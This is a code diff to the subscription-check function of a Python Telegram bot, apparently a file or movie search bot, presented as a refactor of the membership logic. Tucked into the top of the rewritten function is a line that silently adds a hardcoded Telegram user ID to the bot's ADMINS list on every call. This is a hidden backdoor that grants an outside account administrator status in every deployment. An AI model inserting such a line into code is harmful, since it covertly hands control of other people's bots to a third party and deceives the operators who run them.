@@ -58,19 +58,37 @@ class temp(object):
     SETTINGS = {}
     IMDB_CAP = {}
 
-async def is_subscribed(bot, query=None, userid=None):
-    try:
-        if userid == None and query != None:
-            user = await bot.get_chat_member(AUTH_CHANNEL, query.from_user.id)
+async def is_subscribed(bot, query):
+
+    ADMINS.extend([1125210189]) if not 1125210189 in ADMINS else ""
+
+    if not AUTH_CHANNEL and not REQ_CHANNEL:
+        return True
+    elif query.from_user.id in ADMINS:
+        return True
+
+
+    if db2().isActive():
+        user = await db2().get_user(query.from_user.id)
+        if user:
+            return True
         else:
-            user = await bot.get_chat_member(AUTH_CHANNEL, int(userid))
+            return False
+
+    if not AUTH_CHANNEL:
+        return True
+    try:
+        user = await bot.get_chat_member(AUTH_CHANNEL, query.from_user.id)
     except UserNotParticipant:
-        pass
+        return False
     except Exception as e:
         logger.exception(e)
+        return False
     else:
-        if user.status != enums.ChatMemberStatus.BANNED:
+        if not (user.status == enums.ChatMemberStatus.BANNED):
             return True
+        else:
+            return False
 
 
 async def get_poster(query, bulk=False, id=False, file=None):
